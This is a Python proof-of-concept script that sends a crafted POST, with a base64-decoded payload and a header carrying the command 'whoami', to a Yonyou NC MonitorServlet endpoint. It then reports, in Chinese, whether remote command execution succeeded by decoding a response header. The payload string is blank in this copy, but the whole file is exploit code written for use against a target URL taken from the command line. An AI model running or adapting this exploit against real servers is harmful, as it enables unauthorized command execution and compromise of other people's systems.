#!/usr/bin/python3
#-*- coding:utf-8 -*-

import base64
import requests
import random
import re
import json
import sys
import binascii

def to_bytes(obj, encoding="utf-8", errors="strict"):
    try:
        return obj.encode(encoding, errors)
    except AttributeError:
        return bytes(obj, encoding)

def base64_decode(data):
    data = to_bytes(data, "ascii")
    #: Add padding, we need a string with a length multiple of 4
    data += b"=" * (-len(data) % 4)
    return base64.b64decode(data, b"-_")


def verify(site):
    payload = ""
    payload_de =  base64_decode(payload)

    burp0_url = site + "/servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet"
    burp0_headers = {"X-T0KEN-INF0": "whoami", "Accept-Encoding": "gzip, deflate", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Content-Type": "multipart/form-data;", "Accept-Language": "zh-CN,zh;q=0.9"}

    r = requests.post(burp0_url, headers=burp0_headers, data=payload_de, verify=False)
    res_header = r.headers
    if "X-T0ken" in res_header:
        return base64_decode(res_header["X-T0ken"])
    return ""



if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行命令 whoami 的结果为：", info)
    else:
        print("[-]漏洞不存在")
